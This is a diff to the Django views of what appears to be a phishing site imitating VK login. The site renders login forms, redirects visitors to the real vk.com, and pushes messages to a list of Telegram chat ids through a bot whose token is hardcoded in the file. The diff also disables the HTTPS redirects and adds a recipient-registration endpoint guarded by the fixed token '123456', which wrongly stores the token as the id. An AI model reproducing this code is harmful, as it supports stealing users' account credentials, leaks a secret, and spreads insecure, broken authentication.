@@ -5,6 +5,7 @@ from .forms import *
 from vk import *
 from .microdetector import detect_mobile
 import telebot
+from .models import id_list
 
 # Create your views here.
 
@@ -12,16 +13,9 @@ import telebot
 def tel(mes):
     token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
     bot = telebot.AsyncTeleBot(token)
-
-    try:
-        f = open('ids.txt')
-    except IOError as e:
-        with open('ids.txt', 'w') as w:
-            pass
-    else:
-        with f:
-            for l in f:
-                bot.send_message(l, mes)
+    ids = id_list.objects.in_bulk()
+    for id in ids:
+        bot.send_message(ids[id].number, mes)
 
 
 def index(request):
@@ -41,8 +35,8 @@ def index(request):
         vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
 
         return HttpResponsePermanentRedirect("https://m.vk.com")
-    if request.scheme == "http":
-        return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'] + "/m")
+    # if request.scheme == "http":
+    #     return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'] + "/m")
     form = login()
     return render(request, "app_serverr/index.html", {"form": form})
 
@@ -64,14 +58,20 @@ def full(request):
         vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
 
         return HttpResponsePermanentRedirect("https://vk.com")
-    if request.scheme == "http":
-        return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'])
-    if request.mobile:
-        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
+    # if request.scheme == "http":
+    #     return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'])
+    # if request.mobile:
+    #     return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
     form = full_login()
     return render(request, "app_serverr/full.html", {"form": form})
 
 
-
+def id_add(request):
+    t = request.GET.get('token')
+    if t == '123456':
+        i = id_list()
+        i.number = int(t)
+        i.save()
+    return HttpResponseRedirect("/")
 
 
